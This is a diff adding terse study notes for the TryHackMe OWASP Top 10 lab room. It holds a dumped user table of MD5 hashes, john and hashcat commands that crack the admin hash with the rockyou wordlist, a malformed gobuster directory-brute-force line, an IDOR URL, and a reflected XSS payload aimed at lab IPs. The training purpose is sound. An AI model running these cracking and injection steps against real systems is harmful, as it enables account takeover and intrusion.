@@ -1,4 +1,44 @@
 https://tryhackme.com/room/owasptop10
+
+4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
+23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
+4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
+
+admin.txt
+6eea9b7ef19179a06954edd0f6c05ceb
+
+
+john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt admin.txt
+john --show --format=RAW-MD5 admin.txt
+qwertyuiop
+
+
+.\hashcat.exe -m 0 '6eea9b7ef19179a06954edd0f6c05ceb' .\rockyou.txt
+
+https://crackstation.net/
+
+
+What is the name of the mentioned directory? 
+gobuster -u dir $ip /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+
+Task 18 [Severity 5] Broken Access Control (IDOR Challenge) 
+http://10.10.75.28/note.php?note=0
+
+
+
+
+Task 19 [Severity 6] Security Misconfiguration 
+
+
+Hack into the webapp, and find the flag!
+google search Pensive Notes Credentials
+
+
+http://10.10.84.210/reflected?keyword=%3Cscript%3Ealert(%E2%80%9CHello%20World%E2%80%9D)%3C/script%3E
+
+
+https://tryhackme.com/room/owasptop10
 https://h0j3n.medium.com/tryhackme-owasp-top-10-5d168ff0563b
 https://musyokaian.medium.com/owasp-top-10-tryhackme-b7d02f29254b
 https://blog.raw.pm/en/TryHackMe-OWASP-Top-10-write-up/
